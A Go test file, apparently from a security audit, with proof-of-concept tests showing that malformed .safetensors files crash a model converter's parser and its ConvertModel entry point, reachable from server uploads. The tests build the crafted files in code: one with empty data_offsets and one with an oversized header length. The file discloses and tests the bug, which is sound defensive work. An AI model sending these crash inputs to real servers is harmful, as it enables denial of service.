package convert

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"
)

// buildSafetensors frames a JSON header the way a real .safetensors file does:
// 8-byte little-endian header length, then the header JSON.
func buildSafetensors(headerJSON string) []byte {
	out := make([]byte, 8)
	binary.LittleEndian.PutUint64(out, uint64(len(headerJSON)))
	return append(out, []byte(headerJSON)...)
}

// C3 / F2-2: data_offsets is an empty array. parseSafetensors accesses
// value.Offsets[0] / value.Offsets[1] (reader_safetensors.go:97-98) with the
// only guard being Type != "", so this indexes an empty slice -> panic.
func TestPoC_C3_EmptyDataOffsets(t *testing.T) {
	malicious := buildSafetensors(`{"t":{"dtype":"F32","shape":[1],"data_offsets":[]}}`)
	fsys := fstest.MapFS{"model.safetensors": {Data: malicious}}

	defer func() {
		if r := recover(); r != nil {
			t.Logf("PoC C3 CONFIRMED: parseSafetensors panicked as predicted: %v", r)
			return
		}
		t.Fatalf("expected a panic from empty data_offsets, but none occurred")
	}()

	_, _ = parseSafetensors(fsys, strings.NewReplacer(), "model.safetensors")
}

// C3 / F2-1: the 8-byte header length is read straight into make([]byte, 0, n)
// (reader_safetensors.go:46). A value > MaxInt makes makeslice panic.
func TestPoC_C3_NegativeHeaderLen(t *testing.T) {
	out := make([]byte, 8)
	binary.LittleEndian.PutUint64(out, 0xFFFFFFFFFFFFFFFF) // -> negative int cap
	fsys := fstest.MapFS{"model.safetensors": {Data: out}}

	defer func() {
		if r := recover(); r != nil {
			t.Logf("PoC C3 CONFIRMED: header-length make panicked as predicted: %v", r)
			return
		}
		t.Fatalf("expected a panic from oversized header length, but none occurred")
	}()

	_, _ = parseSafetensors(fsys, strings.NewReplacer(), "model.safetensors")
}

// C3 through the REAL public entry point convert.ConvertModel — the exact
// function server/create.go:571 calls on attacker-uploaded blobs. Minimal valid
// gate (config.json + empty tokenizer.json, per TestConvertInvalidDatatype) plus
// a malicious model.safetensors -> panic reaches ConvertModel.
func TestPoC_C3_ConvertModelEntry(t *testing.T) {
	dir := t.TempDir()
	must := func(name, content string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	must("config.json", `{"architectures":["LlamaForCausalLM"]}`)
	must("tokenizer.json", `{}`)

	// malicious safetensors: framed header with data_offsets:[]
	hdr := `{"model.layers.0.mlp.down_proj.weight":{"dtype":"F32","shape":[1],"data_offsets":[]}}`
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(len(hdr)))
	buf = append(buf, []byte(hdr)...)
	if err := os.WriteFile(filepath.Join(dir, "model.safetensors"), buf, 0o644); err != nil {
		t.Fatal(err)
	}

	out, err := os.CreateTemp(t.TempDir(), "f16")
	if err != nil {
		t.Fatal(err)
	}
	defer out.Close()

	defer func() {
		if r := recover(); r != nil {
			t.Logf("PoC C3 CONFIRMED via ConvertModel (server sink): panic: %v", r)
			return
		}
		t.Fatalf("expected ConvertModel to panic, but it did not")
	}()

	_ = ConvertModel(os.DirFS(dir), out)
}
